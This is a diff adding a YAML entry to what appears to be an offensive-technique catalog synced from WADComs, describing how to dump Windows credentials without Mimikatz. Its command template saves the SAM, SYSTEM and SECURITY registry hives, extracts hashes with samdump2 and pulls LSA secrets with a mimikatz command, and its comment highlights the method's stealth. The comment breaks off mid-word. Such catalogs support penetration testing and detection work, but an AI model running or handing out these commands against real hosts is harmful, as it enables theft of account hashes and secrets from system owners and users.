@@ -1,0 +1,33 @@
+id: wadcoms/creddumpwithoutmimilkatz
+type: technique
+platform: active-directory
+name: CredDumpWithoutMimilkatz
+phases:
+- discovery
+capabilities:
+- discovery
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: verify upstream LICENSE
+  upstream_version: a864cd1
+  last_synced: '2026-08-25'
+preconditions:
+- shell
+- privesc
+- exploitation
+commands:
+- template: "# The following command will dump the SAM, SYSTEM, and SECURITY hives to the current directory.\n\
+    reg save HKLM\\SAM sam.hive\nreg save HKLM\\SYSTEM system.hive\nreg save HKLM\\SECURITY security.hive\n\
+    \n#Assuming you have transfered the hives to your kali\nsamdump2 system sam \n\n#We can also get lsa\
+    \ secrets via mimikatz\nlsadump::secrets /system:c:\\temp\\system.hive /security:c:\\temp\\security.hive"
+  comment: 'The lsass Process while great, is no where neaar the only way to dump credintials from windows.
+    One of which is access the three registry hives: SAM, SYSTEM, and SECURITY. This is a method that
+    can be used to dump credentials without mimikatz as well as offer some potenial stealt'
+references:
+- https://www.ired.team/offensive-security/credential-access-and-credential-dumping
+- https://www.synacktiv.com/en/publications/lsa-secrets-revisiting-secretsdump
+tags:
+- active-directory
+- wadcoms
